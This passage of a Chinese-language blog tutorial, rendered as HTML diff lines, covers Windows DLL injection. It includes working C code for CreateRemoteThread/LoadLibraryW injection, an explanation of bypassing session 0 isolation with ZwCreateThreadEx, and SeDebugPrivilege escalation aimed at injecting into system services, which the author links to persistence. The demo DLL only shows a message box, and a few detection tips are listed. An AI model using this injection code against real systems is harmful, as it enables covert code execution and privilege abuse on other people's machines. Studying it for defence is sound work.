+    * 2&#x3001;&#x5229;&#x7528;PEB&#x8BA1;&#x7B97;&#x76EE;&#x6807;&#x7A0B;&#x5E8F;&#x7684;kerneldll&#x5730;&#x5740;&#xFF0C;&#x590D;&#x6742;&#x4F46;&#x662F;&#x9002;&#x5408;&#x8FDC;&#x7A0B;
+    */</span> 
+    <span class="hljs-comment">//HMODULE hMOD = GetModuleHandle(L&quot;kernel32.dll&quot;);</span>
+    HMODULE hMOD = GetModuleHandle(<span class="hljs-string">L&quot;kernelbase.dll&quot;</span>);
+    FARPROC pThreadProc = GetProcAddress(hMOD, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] GetProcAddress sucess pthreadproc = %p\n&quot;</span>, pThreadProc);
+
+    <span class="hljs-comment">// &#x6267;&#x884C;dll</span>
+    HANDLE hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pThreadProc, pRemotebuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] CreateRemoteThread sucess \n&quot;</span>);
+
+    <span class="hljs-comment">// &#x7B49;&#x5F85;&#x4FE1;&#x53F7;,&#x521B;&#x5EFA;&#x7EBF;&#x7A0B;&#x5E76;&#x7B49;&#x5F85;&#x7EBF;&#x7A0B;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#xFF0C;&#x8FD9;&#x91CC;WaitForSingleObject&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x8981;&#x8BBE;&#x7F6E;&#x4E3A;-1&#x624D;&#x80FD;&#x591F;&#x4E00;&#x76F4;&#x7B49;&#x5F85;</span>
+    <span class="hljs-comment">// &#x7B49;&#x7740;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x5B8C;dll&#x4E4B;&#x540E;&#x624D;&#x9000;&#x51FA;&#x3002;&#x4F46;&#x662F;&#x5B9E;&#x9645;&#x53D1;&#x73B0;&#x610F;&#x4E49;&#x4E0D;&#x5927;</span>
+    <span class="hljs-comment">//WaitForSingleObject(hProcess, INFINITE);</span>
+
+    <span class="hljs-comment">// &#x5173;&#x95ED;&#x53E5;&#x67C4;</span>
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#xFF1A;&#x611F;&#x8C22;lll&#x54E5;&#x7684;&#x652F;&#x6301;&#x3002;</p>
+<ul>
+<li>&#x6CE8;&#x610F;loadlibrary&#x7684;&#x53C2;&#x6570;&#x6A21;&#x5F0F;&#x548C;&#x53C2;&#x6570;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;char&#x8FD8;&#x662F;unicode</li>
+<li>&#x4E3B;&#x8981;dll&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E2D;&#x6587;&#xFF0C;&#x540C;&#x76EE;&#x5F55;&#x4E5F;&#x8981;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</li>
+</ul>
+<p>&#x80FD;&#x7528;&#x7684;&#x4EE3;&#x7801;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;tchar.h&gt;</span></span>
+
+
+<span class="hljs-comment">/*
+* &#x6CE8;&#x610F;loadlibrary&#x7684;&#x53C2;&#x6570;&#x6A21;&#x5F0F;&#x548C;&#x53C2;&#x6570;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;char&#x8FD8;&#x662F;unicode
+* &#x4E3B;&#x8981;dll&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E2D;&#x6587;&#xFF0C;&#x540C;&#x76EE;&#x5F55;&#x4E5F;&#x8981;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
+*/</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> notePID 30028</span>
+<span class="hljs-comment">//char* dllpath = &quot;C:\\Users\\rootkit\\Desktop\\dll&#x6CE8;&#x5165;\\MessageboxDll.dll&quot;;</span>
+<span class="hljs-comment">//char* dllpath = &quot;C:\\Users\\rootkit\\Desktop\\32_MessageboxDll.dll&quot;;</span>
+<span class="hljs-comment">//char* dllpath = &quot;messageboxDll.dll&quot;;</span>
+LPCWSTR dllpath = <span class="hljs-string">L&quot;C:\\Users\\rootkit\\Desktop\\messageboxDll.dll&quot;</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">size_t</span> dwsize = (_tcslen(dllpath) + <span class="hljs-number">1</span>) * <span class="hljs-keyword">sizeof</span>(TCHAR);
+    <span class="hljs-comment">//size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR);</span>
+
+    <span class="hljs-comment">// &#x83B7;&#x53D6;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#xFF0C;&#x91C7;&#x7528;&#x6253;&#x5F00;&#x73B0;&#x6709;&#x8FDB;&#x7A0B;&#x7684;&#x5F62;&#x5F0F;</span>
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID);
+
+    <span class="hljs-comment">// &#x5728;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x5F00;&#x8F9F;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6CE8;&#x5165;&#x7684;dll&#x7684;&#x5730;&#x5740;</span>
+    LPVOID pRemotebuf= VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwsize, MEM_COMMIT, PAGE_READWRITE);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] VirtualAlloc sucess addr = %p\n&quot;</span>, pRemotebuf);
+
+    <span class="hljs-comment">// &#x5411;&#x5F00;&#x8F9F;&#x51FA;&#x6765;&#x7684;&#x5730;&#x5740;&#x5199;&#x5165;dll&#x8DEF;&#x5F84;</span>
+    WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] WriteProcessMemory sucess write dll path to target memroy \n&quot;</span>);
+
+    <span class="hljs-comment">/*
+    * &#x83B7;&#x53D6;loadlibrary&#x7684;&#x5730;&#x5740;&#x3002;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;
+    * 1&#x3001;&#x76F4;&#x63A5;&#x5728;&#x672C;&#x7A0B;&#x5E8F;&#x83B7;&#x5F97;&#xFF08;&#x5728;Windows&#x4E2D;&#x5171;&#x4EAB;&#x5E93;&#x7684;&#x5730;&#x5740;&#x662F;&#x4E00;&#x5B9A;&#x7684;&#xFF09;
+    * 2&#x3001;&#x5229;&#x7528;PEB&#x8BA1;&#x7B97;&#x76EE;&#x6807;&#x7A0B;&#x5E8F;&#x7684;kerneldll&#x5730;&#x5740;&#xFF0C;&#x590D;&#x6742;&#x4F46;&#x662F;&#x9002;&#x5408;&#x8FDC;&#x7A0B;
+    */</span> 
+    HMODULE hMOD = GetModuleHandle(<span class="hljs-string">L&quot;kernelbase.dll&quot;</span>);
+    <span class="hljs-comment">//HMODULE hMOD = GetModuleHandle(L&quot;kernelbase.dll&quot;);</span>
+    LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] GetProcAddress sucess pthreadproc = %p\n&quot;</span>, pThreadProc);
+
+    <span class="hljs-comment">// &#x6267;&#x884C;dll</span>
+    HANDLE hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemotebuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] CreateRemoteThread sucess \n&quot;</span>);
+
+    <span class="hljs-comment">// &#x7B49;&#x5F85;&#x4FE1;&#x53F7;,&#x521B;&#x5EFA;&#x7EBF;&#x7A0B;&#x5E76;&#x7B49;&#x5F85;&#x7EBF;&#x7A0B;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#xFF0C;&#x8FD9;&#x91CC;WaitForSingleObject&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x8981;&#x8BBE;&#x7F6E;&#x4E3A;-1&#x624D;&#x80FD;&#x591F;&#x4E00;&#x76F4;&#x7B49;&#x5F85;</span>
+    WaitForSingleObject(hProcess, INFINITE);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, GetLastError());
+
+    <span class="hljs-comment">// &#x5173;&#x95ED;&#x53E5;&#x67C4;</span>
+    CloseHandle(hProcess);
+    CloseHandle(hThread);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<h3 id="&#x68C0;&#x67E5;&#x65B9;&#x5F0F;">&#x68C0;&#x67E5;&#x65B9;&#x5F0F;</h3>
+<ul>
+<li>&#x901A;&#x8FC7;&#x89C2;&#x5BDF;dll&#x7684;&#x663E;&#x8457;&#x7279;&#x5F81;&#x3002;</li>
+<li>&#x5229;&#x7528;&#x8C03;&#x8BD5;&#x5668;&#x89C2;&#x5BDF;&#x3002;</li>
+<li>&#x901A;&#x8FC7;pe explore&#x7684;shift+ctrl+f&#x7684;&#x529F;&#x80FD;&#x6765;&#x641C;&#x7D22;dll&#x7A0B;&#x5E8F;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x88AB;&#x6CE8;&#x5165;&#x3002;</li>
+</ul>
+<h2 id="15&#x3001;&#x7A81;&#x7834;-session-0-&#x9694;&#x79BB;">1.5&#x3001;&#x7A81;&#x7834; session 0 &#x9694;&#x79BB;</h2>
+<p>&#x5982;&#x679C;&#x8981;&#x6CE8;&#x5165;&#x7684;dll&#x4E2D;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E9B;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x4F20;&#x7EDF;&#x7684;&#x8FDC;&#x7A0B;&#x6CE8;&#x5165;&#x65B9;&#x5F0F;&#x662F;&#x4E0D;&#x53EF;&#x53D6;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x4F1A;&#x8BF4;&#x539F;&#x56E0;&#x3002;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;dll&#x6CE8;&#x5165;&#x5B9E;&#x73B0;&#x66F4;&#x5E95;&#x5C42;&#x9AD8;&#x7EA7;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6BD4;&#x5982;&#x4FDD;&#x6301;&#x5B58;&#x6D3B;&#x4E4B;&#x7C7B;&#x7684;&#x3002;</p>
+<h3 id="session-0&#x9694;&#x79BB;">session 0&#x9694;&#x79BB;</h3>
+<h4 id="&#x5386;&#x53F2;">&#x5386;&#x53F2;</h4>
+<p>&#x5728;Windows XP&#x3001;Windows Server 2003&#xFF0C;&#x4EE5;&#x53CA;&#x66F4;&#x8001;&#x7248;&#x672C;&#x7684;Windows&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;<strong>&#x670D;&#x52A1;</strong>&#x548C;<strong>&#x5E94;&#x7528;&#x7A0B;&#x5E8F;</strong>&#x4F7F;&#x7528;<strong>&#x76F8;&#x540C;&#x7684;&#x4F1A;&#x8BDD;</strong>&#xFF08;Session&#xFF09;&#x8FD0;&#x884C;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x4F1A;&#x8BDD;&#x662F;&#x7531;<strong>&#x7B2C;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x5230;&#x63A7;&#x5236;&#x53F0;&#x7684;&#x7528;&#x6237;</strong>&#x542F;&#x52A8;&#x7684;&#x3002;&#x8BE5;<strong>&#x4F1A;&#x8BDD;&#x5C31;&#x53EB;&#x505A;Session 0</strong>&#x3002;</p>
+<p>&#x4ECE;Windows Vista&#x5F00;&#x59CB;&#xFF0C;<strong>&#x53EA;&#x6709;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x6258;&#x7BA1;&#x5230;Session 0&#x4E2D;</strong>&#xFF0C;<strong>&#x7528;&#x6237;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;</strong>&#x548C;<strong>&#x670D;&#x52A1;</strong>&#x4E4B;&#x95F4;&#x4F1A;&#x88AB;&#x9694;&#x79BB;&#xFF0C;&#x5E76;&#x88AB;&#x8981;&#x6C42;&#x8FD0;&#x884C;&#x5728;<strong>&#x7528;&#x6237;&#x767B;&#x5F55;&#x5230;&#x7CFB;&#x7EDF;&#x65F6;&#x521B;&#x5EFA;&#x7684;&#x540E;&#x7EED;&#x4F1A;&#x8BDD;&#x4E2D;</strong>&#x3002;&#x4F8B;&#x5982;&#x7B2C;&#x4E00;&#x4E2A;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x521B;&#x5EFA; Session 1&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x767B;&#x5F55;&#x7684;&#x7528;&#x6237;&#x521B;&#x5EFA;Session 2&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;</p>
+<p>&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6743;&#x9650;&#x6DF7;&#x4E71;&#x9020;&#x6210;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x5FAE;&#x8F6F;&#x63D0;&#x4F9B;&#x4E86;SESSION 0 &#x9694;&#x79BB;&#x673A;&#x5236;&#x3002;</p>
+<p><img src="dll-inject/image-20230405143553598.png" alt="image-20230405143553598"></p>
+<p>&#x7C7B;&#x4F3C;&#x4E8E;&#x5965;&#x7279;&#x66FC;&#x91CC;&#x7684;&#x5B87;&#x5B99;&#xFF0C;session 0&#x5C31;&#x662F;&#x6709;M78&#x661F;&#x4E91;&#x7684;&#x5B87;&#x5B99;&#xFF0C;&#x8D5B;&#x7F57;&#x98DE;&#x51FA;&#x6765;&#x770B;&#x5230;&#x7684;&#x5176;&#x4ED6;&#x5B87;&#x5B99;&#x5C31;&#x662F;session1- n&#x8FD9;&#x4E9B;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x8981;&#x5B9E;&#x73B0;&#x7684;&#x5C31;&#x662F;&#x4ECE;&#x5176;&#x4ED6;session&#x4E2D;&#xFF0C;&#x5C06;dll&#x6CE8;&#x5165;&#x5230;session 0&#x4E2D;&#x3002;</p>
+<h3 id="&#x539F;&#x7406;&#x65B9;&#x6CD5;">&#x539F;&#x7406;&#x65B9;&#x6CD5;</h3>
+<p>&#x7531;&#x4E8E;SESSION 0&#x9694;&#x79BB;&#x673A;&#x5236;&#x5728;&#x5185;&#x6838;6.0&#x4E4B;&#x540E;&#xFF08;vista&#x3001;7&#x3001;8...&#xFF09;,&#x5F53;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x540E;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x8FD0;&#x884C;&#xFF0C;&#x901A;&#x8FC7;&#x5148;&#x6302;&#x8D77;&#x8FDB;&#x7A0B;&#xFF0C;&#x67E5;&#x770B;&#x8981;&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x6240;&#x5728;&#x4F1A;&#x8BDD;&#x5C42;&#x4E4B;&#x540E;&#x518D;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x6062;&#x590D;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>CreateRemoteThread</code>&#x65E0;&#x6CD5;&#x5B9E;&#x73B0;&#x3010;CreateSuspended&#x7684;&#x53C2;&#x6570;&#x503C;&#x4E3A;1&#x5BFC;&#x81F4;&#x7EBF;&#x7A0B;&#x65E0;&#x6CD5;&#x6062;&#x590D;&#x8FD0;&#x884C;&#xFF0C;&#x5BFC;&#x81F4;DLL&#x6CE8;&#x5165;&#x5931;&#x8D25;&#x3002;&#x3011;</p>
+<h3 id="&#x5173;&#x952E;api">&#x5173;&#x952E;API</h3>
+<h4 id="zwcreatethreadex">ZwCreateThreadEx</h4>
+<p>&#x8FD9;&#x4E2A;api&#x6CA1;&#x6709;&#x516C;&#x5E03;&#xFF0C;&#x6240;&#x4EE5;&#x4ECB;&#x7ECD;&#x4E0D;&#x591A;&#x3002;&#x5728; <code>ntdll.dll</code> &#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x58F0;&#x660E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F7F;&#x7528; <code>GetProcAddress</code>&#x4ECE; <code>ntdll.dll</code>&#x4E2D;&#x83B7;&#x53D6;&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x5BFC;&#x51FA;&#x5730;&#x5740;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-comment">// 64bit&#x7684;&#x60C5;&#x51B5;&#x4E0B;</span>
+<span class="hljs-function">DWORD WINAPI <span class="hljs-title">ZwCreateThreadEx</span><span class="hljs-params">(
+         PHANDLE ThreadHandle,
+         ACCESS_MASK DesiredAccess,
+         LPVOID ObjectAttributes,
+         HANDLE ProcessHandle,
+         LPTHREAD_START_ROUTINE lpStartAddress,
+         LPVOID lpParameter,
+         ULONG CreateThreadFlags,
+         SIZE_T ZeroBits,
+         SIZE_T StackSize,
+         SIZE_T MaximumStackSize,
+         LPVOID pUnkown)</span></span>;
+
+<span class="hljs-comment">// 32bit&#x7684;&#x60C5;&#x51B5;&#x4E0B; </span>
+<span class="hljs-function">DWORD WINAPI <span class="hljs-title">ZwCreateThreadEx</span><span class="hljs-params">(
+         PHANDLE ThreadHandle,
+         ACCESS_MASK DesiredAccess,
+         LPVOID ObjectAttributes,
+         HANDLE ProcessHandle,
+         LPTHREAD_START_ROUTINE lpStartAddress,
+         LPVOID lpParameter,
+         BOOL CreateSuspended,
+         DWORD dwStackSize,
+         DWORD dw1,
+         DWORD dw2,
+         LPVOID pUnkown)</span></span>;
+</code></pre>
+<p>&#x7A81;&#x7834;&#x5230;session 0&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x63D0;&#x9AD8;&#x6743;&#x9650;&#x5230;system&#x6743;&#x9650;&#x3002;</p>
+<h4 id="openprocesstoken">OpenProcessToken</h4>
+<p>&#x6253;&#x5F00;&#x4E0E;&#x8FDB;&#x7A0B;&#x5173;&#x8054;&#x7684;<a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/a-gly" target="_blank">&#x8BBF;&#x95EE;&#x4EE4;&#x724C;</a>&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">BOOL <span class="hljs-title">OpenProcessToken</span><span class="hljs-params">(
+__in HANDLE ProcessHandle,     <span class="hljs-comment">//&#x8981;&#x4FEE;&#x6539;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x7684;&#x8FDB;&#x7A0B;&#x53E5;&#x67C4;</span>
+__in DWORD DesiredAccess,     <span class="hljs-comment">//&#x6307;&#x5B9A;&#x4F60;&#x8981;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</span>
+__out PHANDLE TokenHandle     <span class="hljs-comment">//&#x8FD4;&#x56DE;&#x7684;&#x8BBF;&#x95EE;&#x4EE4;&#x724C;&#x6307;&#x9488;</span>
+)</span></span>;
+</code></pre>
+<p>&#x5982;&#x679C;&#x8BE5;&#x51FD;&#x6570;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x975E;&#x96F6;&#x503C;&#x3002;</p>
+<h4 id="lookupprivilegevaluea">LookupPrivilegeValueA</h4>
+<p>&#x68C0;&#x7D22;&#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x4E0A;&#x7528;&#x4E8E;&#x672C;&#x5730;&#x8868;&#x793A;&#x6307;&#x5B9A;&#x7279;&#x6743;&#x540D;&#x79F0;&#x7684; LUID (LUID) &#x672C;&#x5730;<a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/l-gly" target="_blank">&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x7B26;</a>&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">BOOL <span class="hljs-title">LookupPrivilegeValueA</span><span class="hljs-params">(
+  LPCSTR lpSystemName,  <span class="hljs-comment">//&#x8981;&#x67E5;&#x770B;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x76F4;&#x63A5;&#x7528;NULL</span>
+  LPCSTR lpName,        <span class="hljs-comment">//&#x6307;&#x5411;&#x4E00;&#x4E2A;&#x4EE5;&#x96F6;&#x7ED3;&#x5C3E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6307;&#x5B9A;&#x7279;&#x6743;&#x7684;&#x540D;&#x79F0;</span>
+  PLUID  lpLuid         <span class="hljs-comment">//&#x7528;&#x6765;&#x63A5;&#x6536;&#x6240;&#x8FD4;&#x56DE;&#x7684;&#x5236;&#x5B9A;&#x7279;&#x6743;&#x540D;&#x79F0;&#x7684;&#x4FE1;&#x606F;</span>
+)</span></span>;
+</code></pre>
+<p>&#x5982;&#x679C;&#x51FD;&#x6570;&#x6210;&#x529F;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5C06;&#x8FD4;&#x56DE;&#x975E;&#x96F6;&#x3002;</p>
+<h4 id="adjusttokenprivileges">AdjustTokenPrivileges</h4>
+<p>&#x542F;&#x7528;&#x6216;&#x7981;&#x7528;&#x6307;&#x5B9A;<a href="https://learn.microsoft.com/zh-cn/windows/desktop/SecGloss/a-gly" target="_blank">&#x8BBF;&#x95EE;&#x4EE4;&#x724C;</a>&#x4E2D;&#x7684;&#x7279;&#x6743;&#x3002; &#x5728;&#x8BBF;&#x95EE;&#x4EE4;&#x724C;&#x4E2D;&#x542F;&#x7528;&#x6216;&#x7981;&#x7528;&#x7279;&#x6743;&#x9700;&#x8981;TOKEN_ADJUST_PRIVILEGES&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-function">BOOL <span class="hljs-title">AdjustTokenPrivileges</span><span class="hljs-params">(
+HANDLE TokenHandle,             <span class="hljs-comment">//&#x5305;&#x542B;&#x7279;&#x6743;&#x7684;&#x53E5;&#x67C4;</span>
+BOOL DisableAllPrivileges,        <span class="hljs-comment">//&#x7981;&#x7528;&#x6240;&#x6709;&#x6743;&#x9650;&#x6807;&#x5FD7;</span>
+PTOKEN_PRIVILEGES NewState,        <span class="hljs-comment">//&#x65B0;&#x7279;&#x6743;&#x4FE1;&#x606F;&#x7684;&#x6307;&#x9488;(&#x7ED3;&#x6784;&#x4F53;)</span>
+DWORD BufferLength,             <span class="hljs-comment">//&#x7F13;&#x51B2;&#x6570;&#x636E;&#x5927;&#x5C0F;,&#x4EE5;&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;&#x7684;PreviousState&#x7684;&#x7F13;&#x5B58;&#x533A;(sizeof)</span>
+PTOKEN_PRIVILEGES PreviousState,<span class="hljs-comment">//&#x63A5;&#x6536;&#x88AB;&#x6539;&#x53D8;&#x7279;&#x6743;&#x5F53;&#x524D;&#x72B6;&#x6001;&#x7684;Buffer</span>
+PDWORD ReturnLength             <span class="hljs-comment">//&#x63A5;&#x6536;PreviousState&#x7F13;&#x5B58;&#x533A;&#x8981;&#x6C42;&#x7684;&#x5927;&#x5C0F;</span>
+)</span></span>;
+</code></pre>
+<h3 id="&#x5148;&#x63D0;&#x6743;">&#x5148;&#x63D0;&#x6743;</h3>
+<p>win10&#x7CFB;&#x7EDF;&#x4E0B;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8981;&#x6CE8;&#x5165;&#x7CFB;&#x7EDF;&#x6743;&#x9650;&#x7684;exe&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;debug&#x8C03;&#x8BD5;&#x6743;&#x9650;&#x3002;&#x5728;&#x7CFB;&#x7EDF;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;MessageBox&#x51FD;&#x6570;&#xFF0C;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+
+<span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPrivilege</span><span class="hljs-params">()</span>
+</span>{
+    HANDLE hToken;
+    BOOL fOk = FALSE;
+    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
+    {
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = <span class="hljs-number">1</span>;
+        LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);
+
+        tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+
+        fOk = (GetLastError() == ERROR_SUCCESS);
+        CloseHandle(hToken);
+    }
+    <span class="hljs-keyword">return</span> fOk;
+}
+</code></pre>
+<p>&#x7136;&#x540E;&#x5229;&#x7528;&#x63D0;&#x5230;&#x7684;API&#x8FDB;&#x884C;&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x7EA7;&#x522B;&#x7684;dll&#x7684;&#x6CE8;&#x5165;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    ULONG CreateThreadFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    LPVOID pUnkown)</span></span>;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    BOOL CreateSuspended,
+    DWORD dwStackSize,
+    DWORD dw1,
+    DWORD dw2,
+    LPVOID pUnkown)</span></span>;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> notePID 23472</span>
+
+LPCWSTR pszDllFileName = <span class="hljs-string">L&quot;C:\\Users\\rootkit\\Desktop\\messageboxDll.dll&quot;</span>;
+
+<span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPrivilege</span><span class="hljs-params">()</span>
+</span>{
+    HANDLE hToken;
+    BOOL fOk = FALSE;
+
